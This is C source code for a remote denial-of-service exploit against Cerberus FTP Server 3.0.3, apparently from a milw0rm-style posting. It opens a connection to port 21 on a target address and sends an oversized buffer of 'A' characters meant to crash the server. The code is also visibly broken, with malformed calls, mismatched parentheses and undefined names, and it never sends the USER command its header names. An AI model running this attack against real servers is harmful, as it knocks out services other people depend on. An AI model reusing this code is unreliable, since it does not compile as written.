/*

vulnerab         : Remote Denial of Service
Command vulnerab : User
Software         : Cerberus FTP Server
Versian          : 3.0.3
website software : http://www.cerberusftp.com

greetz : *Str0ke*

Milw0rm is The best in world

*/


#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <stdlib.h>
#include <conio.h>
#pragma comment(lib, "ws2_32.lib")
#define size 520



int main(int argc, char *argv[])
{

        int cer1,cer2,cer3;
        char buffer[size];

  if (argc < 2)
{
   printf("\n\n Cerberus FTP Server V 3.0.3 Remote Denial Of Service Exploit \n
\n");
   printf("\n u  : file ip \n");
   printf("\n EX : Cerberus.exe 127.0.0.1 \n");
   exit(-1);
}
  memset(buffer,"A",520);

        WSADATA wsaData;

  if(WSAStartup (MAKEWORD(2,1),&wsaData) != 0)
  {
          printf("WSAStartup is failed \n");
          exit(-1);
  }
   	struct hostent * remote;

 remote = gethostbyname(argv[1]);
 if(! remote)
 {
         cer1 = inet_addr(argv[1]);
 }
 if (!remote) && (cer1 == INADDR_NONE))
 {
            printf("Unable to resolve %s\n",argv[1]);
        exit(-1);
 }

 cer2 = socket(AF_INET,SOCKET_STREAM,IPPROTO_TCP);
 if(cer2 == INVALID_SOCKET)
 {
         printf("\n Error On Create Socket \n");
         exit(-1);
 }

    struct sockaddr_in ftp;
    if (remote != NULL)
   memcpy(&(ftp.sin_addr),remote->h_addr,remote->h_length);
  else
   ftp.sin_addr.s_addr = addr;
  if (remote)
   ftp.sin_family = remote->h_addrtype;
  else
   ftp.sin_family = AF_INET;
  ftp.sin_port=htons(21);

printf("\n Denial of service FTP server %s \n",argv[1]);
printf("\n Sending Packet\n");
Sleep(1000);
printf("\n packet size = %d byte\n" , sizeof(buffer));
printf("\n Please Wait ... \n");

cer3 = connect (cer2, (struct Sockaddr *), &ftp, sizeof (struct Socketaddr_in))
;
if(cer3 == 0)
{
       	printf("\n again please wait...\n");

 Sleep(500);

        printf("\n c0nnect3d\n");


        send(cer2 , buffer , sizeof(buffer) , 0);
        printf("\n\n Cerberus FTP Server Have been Crashed ! \n\n");
}
else
{
       	printf("\n Cerberus FTP Server not listen in port \n");
}

return 0;
}


